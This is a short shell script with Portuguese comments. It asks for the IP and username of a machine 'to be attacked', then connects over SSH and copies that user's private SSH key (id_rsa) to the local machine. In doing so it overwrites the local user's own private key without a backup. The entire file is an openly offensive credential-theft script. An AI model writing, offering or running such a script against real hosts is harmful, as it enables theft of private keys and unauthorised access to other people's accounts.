#!/bin/sh

main() {
    # Input do IP e Username
    echo "Insira o IP a ser atacado: "
    read remoteIp

    echo "Insira o User a ser atacado: "
    read remoteUsername

    # Junta a string
    remote="${remoteUsername}@${remoteIp}"

    # Local onde o arquivo vai parar
    keyLocal="$HOME/.ssh/id_rsa"

    # Local da chave a ser copiada
    keyRemote="/home/${remoteUsername}/.ssh/id_rsa"

    # Commando para copiar a chave
    ssh ${remote} "cat ${keyRemote}" > ${keyLocal}

    # Set the correct permissions for the local SSH key file
    chmod 600 ${keyLocal}

    echo "Chave copiada de ${remote} para ${keyLocal}"
}
main